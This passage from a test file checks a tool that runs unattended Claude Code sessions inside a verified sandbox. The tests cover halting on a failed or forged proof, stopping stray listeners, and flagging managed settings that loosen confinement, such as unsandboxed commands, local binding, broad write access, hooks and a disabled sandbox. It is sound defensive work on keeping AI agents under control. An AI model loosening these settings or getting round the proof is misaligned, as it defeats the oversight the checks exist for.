    [(made, session) => ({ ...passVerdict(made, session), nonce: 'f'.repeat(16) }), /not this start's/u],
  ]) {
    const fx = runFixture(t);
    const claude = fakeClaude({ dir: fx.dir, env: fx.env, confine });
    const result = fx.cmd(['start', 'launch', 'ENG-1'], { spawn: claude.run });
    assert.equal(result.exitCode, 1);
    assert.match(result.out.find((line) => line.startsWith('halt ')) ?? '', cause);
    const rows = fx.rows();
    assert.deepEqual([rows.at(-3).outcome, rows.at(-3).proof, rows.at(-1).event], ['void', true, 'halt']);
    assert.deepEqual(claude.calls.filter((call) => call.args[0] === 'stop').map((call) => call.args[1]), [STARTED[0].id]);
    assert.equal(readUnattendedMark(STARTED[0].session, { env: fx.env, home: fx.home }).confine, 'failed');
  }
});

test('a failed proof whose session could not be stopped still halts the run, and leaves the start for wait to settle', (t) => {
  const fx = runFixture(t);
  const claude = fakeClaude({ dir: fx.dir, env: fx.env, stoppable: false, confine: (made, session) => ({ ...passVerdict(made, session), pass: false, failed: ['write /x'] }) });
  const result = fx.cmd(['start', 'launch', 'ENG-1'], { spawn: claude.run });
  assert.equal(result.exitCode, 1);
  assert.match(result.out[0], /^halt the start of ENG-1 attempt 1 failed its proof: the session's sandbox proof failed: write \/x, and the session .* could not be stopped/u);
  const rows = fx.rows();
  assert.deepEqual([rows.at(-2).event, rows.at(-2).outcome, rows.at(-2).proof, rows.at(-1).event], ['start', 'uncertain', true, 'halt']);
  assert.match(fx.cmd(['start', 'launch', 'ENG-1']).out[0], /^halt the run is halted/u);
});

test('a start whose proof cannot be prepared refuses, leaves no attempt folder, and records nothing', (t) => {
  const cap = claudeCode.capabilities.projectStart;
  const kept = cap.confineDomains;
  cap.confineDomains = () => ['*'];
  t.after(() => {
    cap.confineDomains = kept;
  });
  const fx = runFixture(t);
  const before = fx.rows().length;
  const result = fx.cmd(['start', 'launch', 'ENG-1']);
  assert.equal(result.exitCode, 1);
  assert.match(result.err.join('\n'), /the sandbox proof cannot be prepared: every host the proof names as unlisted/u);
  assert.equal(existsSync(path.join(fx.state, 'runs', 'launch', 'attempts', 'ENG-1.1')), false);
  assert.equal(fx.rows().length, before);
  assert.deepEqual(fx.claude.starts(), []);
});

test('a passed proof the start cannot file in the session`s mark holds no session', { skip: process.getuid?.() === 0 }, (t) => {
  const fx = runFixture(t);
  const claude = fakeClaude({ dir: fx.dir, env: fx.env, confine: null });
  const folder = markFolder(fx.env);
  let handed = false;
  // Once the session's mark is filed, the proof passes, and the mark folder takes no more writes.
  const wait = () => {
    if (handed || !existsSync(path.join(folder, `${STARTED[0].session}.json`))) return;
    handed = true;
    const work = path.join(realpathSync(fx.state), 'runs', 'launch', 'attempts', 'ENG-1.1', 'work');
    const made = readSmallJson(path.join(path.dirname(work), CONFINE_PLAN));
    writeFileSync(path.join(path.dirname(work), 'drop', CONFINE_VERDICT), JSON.stringify(passVerdict(made, STARTED[0].session)));
    chmodSync(folder, 0o500);
  };
  let result;
  try {
    result = fx.cmd(['start', 'launch', 'ENG-1'], { spawn: claude.run, wait });
  } finally {
    chmodSync(folder, 0o700);
  }
  assert.equal(handed, true);
  assert.equal(result.exitCode, 1);
  assert.match(result.out[0], /could not file the passed proof in the session's mark/u);
});

test('the listener the start runs that never names its port is stopped, and the start refuses', () => {
  const killed = [];
  const fake = () => ({ pid: 2_000_000_000, on() {}, unref() {} });
  const realKill = process.kill;
  process.kill = (pid) => killed.push(pid);
  try {
    const answer = startListener(realpathSync(tmpdir()), { run: fake, pause: () => {} });
    assert.match(answer.problem, new RegExp(`did not start within ${LISTENER_START / 1000} seconds`, 'u'));
  } finally {
    process.kill = realKill;
  }
  assert.deepEqual(killed, [2_000_000_000]);
});

test('the organization`s managed settings, which rank above --settings, are judged as the user`s, with its scalars held to the session`s', (t) => {
  const fx = runFixture(t, { init: false });
  const dir = path.join(fx.root, 'managed');
  const drops = path.join(dir, 'managed-settings.d');
  mkdirSync(drops, { recursive: true });
  const guarded = [path.join(fx.home, '.local', 'state'), fx.state];
  const ask = (value, file = path.join(dir, 'managed-settings.json')) => {
    rmSync(dir, { recursive: true, force: true });
    mkdirSync(drops, { recursive: true });
    if (value !== undefined) writeFileSync(file, typeof value === 'string' ? value : JSON.stringify(value));
    return accessProblem({ env: fx.env, home: fx.home, guarded, pushUrl: 'https://github.com/acme/widgets.git', platform: 'linux', managed: { dir, plists: [] } });
  };
  assert.equal(ask(undefined), null);
  assert.equal(ask({ sandbox: { enabled: true, allowUnsandboxedCommands: false, network: { allowedDomains: ['internal.example'], allowLocalBinding: false }, filesystem: { denyRead: ['~/x'] } } }), null, 'at the session`s values, and narrowing lists');
  assert.match(ask({ sandbox: { allowUnsandboxedCommands: true } }), /managed settings .*managed-settings\.json set sandbox\.allowUnsandboxedCommands/u);
  assert.match(ask({ sandbox: { network: { allowLocalBinding: true } } }), /set sandbox\.network\.allowLocalBinding/u);
  assert.match(ask({ sandbox: { filesystem: { allowWrite: ['~/'] } } }), /set sandbox\.filesystem\.allowWrite/u);
  assert.match(ask({ hooks: { PreToolUse: [] } }), /managed-settings\.json set hooks/u);
  assert.match(ask({ permissions: { additionalDirectories: [fx.state] } }), /managed settings .* grant .* which reaches/u);
  assert.match(ask({ sandbox: { enabled: false } }, path.join(drops, '20-sandbox.json')), /managed-settings\.d\/20-sandbox\.json set sandbox\.enabled/u, 'a drop-in file');
  assert.equal(ask({ sandbox: { enabled: false } }, path.join(drops, '.hidden.json')), null, 'a hidden file the host ignores');
  assert.match(ask('not json'), /cannot be read: it is not JSON/u);
  assert.match(ask({ enabledPlugins: { 'other@market': true } }), /the plugin other@market is enabled/u, 'a plugin the organization turns on');
  assert.match(ask({ enabledPlugins: { [OWN_PLUGIN]: false } }), /this plugin is not enabled/u, 'and this one it turns off');
  // A drop-in folder that is there and cannot be listed, a platform with no documented sources, and a macOS profile.
  rmSync(dir, { recursive: true, force: true });
  mkdirSync(dir);
  writeFileSync(drops, '');
  assert.match(managedSettings({ platform: 'linux', managed: { dir, plists: [] } }).problem, /cannot be listed/u);
  assert.match(managedSettings({ platform: 'win32' }).problem, /on win32 are not ones the start can read/u);
  const plist = path.join(fx.root, 'com.anthropic.claudecode.plist');
  writeFileSync(plist, 'binary');
  const plutil = (stdout, status = 0) => () => ({ status, stdout });
  rmSync(drops);
  assert.deepEqual(managedSettings({ platform: 'darwin', managed: { dir, plists: [plist] }, run: plutil('{"sandbox":{"enabled":false}}') }).documents, [{ source: plist, value: { sandbox: { enabled: false } } }]);
  assert.match(managedSettings({ platform: 'darwin', managed: { dir, plists: [plist] }, run: plutil('', 1) }).problem, /plutil cannot convert it to JSON/u);
  assert.deepEqual(managedSettings({ platform: 'darwin', managed: { dir, plists: [path.join(fx.root, 'none.plist')] } }).documents, []);
  assert.deepEqual(readdirSync(dir), []);
});
